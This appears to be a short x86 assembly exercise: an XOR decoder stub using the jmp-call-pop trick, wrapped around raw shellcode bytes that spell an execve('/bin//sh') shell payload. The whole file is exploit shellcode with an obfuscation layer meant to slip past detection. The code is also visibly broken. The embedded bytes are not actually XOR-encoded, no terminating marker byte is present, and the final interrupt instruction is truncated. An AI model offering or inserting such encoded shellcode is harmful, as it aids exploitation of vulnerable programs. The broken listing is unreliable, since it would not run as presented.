global _start
section .start
_start:


	jmp call_shellcode

shellcode:
	pop esi

decode:
	xor byte [esi], 0xAA
	jz Shellcode
	inc esi
	jmp short decode
	
call_shellcode:
	call shellcode
	Shellcode: db 0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x53,0x89,0xe1,0x31,0xd2,0xb0,0x0b,0xcd
